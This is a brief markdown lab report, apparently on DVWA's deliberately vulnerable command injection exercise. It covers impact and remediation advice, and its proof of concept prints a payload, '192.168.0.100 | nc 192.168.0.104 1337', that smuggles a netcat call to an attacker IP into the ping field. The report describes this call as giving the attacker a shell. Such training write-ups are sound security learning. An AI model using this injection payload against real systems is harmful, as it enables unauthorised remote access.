# DVWA - Command Injection Vulnerability - Remote Code Execution(RCE)

* Introduction:  

CMDI (Command Injection) is a web security vulnerability that allows an attacker to inject malicious Command into a website, which is without any validation interpreted as normal data and get executed by the Backend Systems. 

* Vulnerability Details:  

The vulnerable URL is: `http://10.10.25.252/cmdi`
An attacker can inject a malicious cmd query in the ping IP box.

* Proof of Concept (POC):  

In the User ID field, enter: `192.168.0.100 | nc 192.168.0.104 1337`
This will try to connect to the 192.168.0.104(Attacker IP) on Port 1337 and will give a shell access to the attacker where he can execute CMD on the website backend system.

* Impact:  

If Someone is able to inject a malicious Code in the Website and able to get a Remote Code Execution Exploit, then he can access the system on which the website he been hosted. He can retrieve critical data from the system or can use that as the launchpad for pivoting and attacking other system in the network.

* Steps to Reproduce:

1. Log in as a user on url [http://10.10.25.252/login.php]  
2. Visit the Command Injection Section.  
3. Enter the following payload into the Ping IP field: `192.168.0.100 | nc 192.168.0.104 1337`

* Recommendation:  

1. Implement output encoding for harmful characters to prevent the interpretation of user input as code.  
2. Implement a Strong & Proper Validation  
3. Regularly scan the application for Command Injection vulnerabilities.


* Attachments:  

![cmd1](<screenshots/Screenshot 2025-05-26 170426.png>)  
![cmd2](<screenshots/Screenshot 2025-05-27 111816.png>)